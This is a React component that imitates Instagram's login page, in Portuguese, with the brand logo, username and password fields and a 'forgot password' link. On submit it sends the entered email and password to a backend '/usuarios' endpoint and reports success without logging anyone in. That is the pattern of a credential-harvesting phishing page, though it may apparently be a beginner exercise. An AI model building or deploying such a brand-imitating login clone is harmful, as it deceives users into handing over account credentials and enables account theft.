  import { useRef } from 'react'
import './style.css' 
import api from './api'

function Instagram() {
  const inputEmail = useRef()
  const inputSenha = useRef()

  async function createUsers() {
    if (!inputEmail.current.value || !inputSenha.current.value) {
      alert("Por favor, preencha e-mail e senha.")
      return
    }

    try {
      await api.post('/usuarios', {
        email: inputEmail.current.value,
        senha: inputSenha.current.value
      })

      inputEmail.current.value = ""
      inputSenha.current.value = ""

      alert("Dados enviados com sucesso!")
    } catch (error) {
      console.error("Erro na requisição:", error)
      alert("Erro ao enviar dados para o servidor.")
    }
  }

  return (
    <div className='container'>
      <form onSubmit={(e) => { e.preventDefault(); createUsers(); }}>
        <div className="logo-container">
          <i className="fab fa-instagram instagram-icon"></i>
        </div>

        <input 
          placeholder="E-mail ou nome de usuário" 
          ref={inputEmail} 
          type="email" 
          required 
        />
        
        <input 
          placeholder="Senha" 
          ref={inputSenha} 
          type="password" 
          required 
        />
        
        <button type='submit'>Entrar</button>

        <a href="#" className="forgot-password">Esqueceu a senha?</a>
      </form>
    </div>
  )
}

export default Instagram